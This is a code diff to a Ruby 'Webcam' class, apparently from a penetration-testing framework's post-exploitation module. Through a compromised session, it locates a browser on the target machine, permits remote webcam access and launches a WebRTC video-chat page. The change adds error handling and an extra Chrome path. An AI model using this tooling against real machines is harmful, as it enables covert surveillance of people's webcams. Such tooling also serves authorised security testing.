@@ -59,11 +59,13 @@ class Webcam
   def chat_request
     offerer_id = 'sinn3r_offer'
     remote_browser_path = get_webrtc_browser_path
+
+    if remote_browser_path.blank?
+      raise RuntimeError, "Unable to find a suitable browser on the target machine"
+    end
+
     allow_remote_webcam(remote_browser_path)
     ready_status = init_video_chat(remote_browser_path, offerer_id)
-    unless ready_status
-      raise RuntimeError, "Unable to find a suitable browser to initialize a WebRTC session."
-    end
 
     #select(nil, nil, nil, 1)
     connect_video_chat(offerer_id)
@@ -116,16 +118,22 @@ class Webcam
 
     case client.platform
     when /win/
-      drive = session.sys.config.getenv("SYSTEMDRIVE")
-
-      [
+      paths = [
         "Program Files\\Google\\Chrome\\Application\\chrome.exe",
         "Program Files\\Mozilla Firefox\\firefox.exe",
         "Program Files\\Opera\\launcher.exe"
-      ].each do |browser_path|
-        path = "#{drive}\\#{browser_path}"
-        if file?(path)
-          found_browser_path = path
+      ]
+
+      drive = session.sys.config.getenv("SYSTEMDRIVE")
+      paths = paths.map { |p| "#{drive}\\#{p}" }
+
+      # Old chrome path
+      user_profile = client.sys.config.getenv("USERPROFILE")
+      paths << "#{user_profile}\\Local Settings\\Application Data\\Google\\Chrome\\Application\\chrome.exe"
+
+      paths.each do |browser_path|
+        if file?(browser_path)
+          found_browser_path = browser_path
           break
         end
       end
@@ -172,8 +180,8 @@ class Webcam
     end
 
     exec_opts = {'Hidden' => false, 'Channelized' => false}
-    args = "#{args} #{tmp_dir}\\interface.html"
-    session.sys.process.execute(remote_browser_path, args, exec_opts)
+
+    session.sys.process.execute(remote_browser_path, "#{args} #{tmp_dir}\\interface.html", exec_opts)
   end
 
 
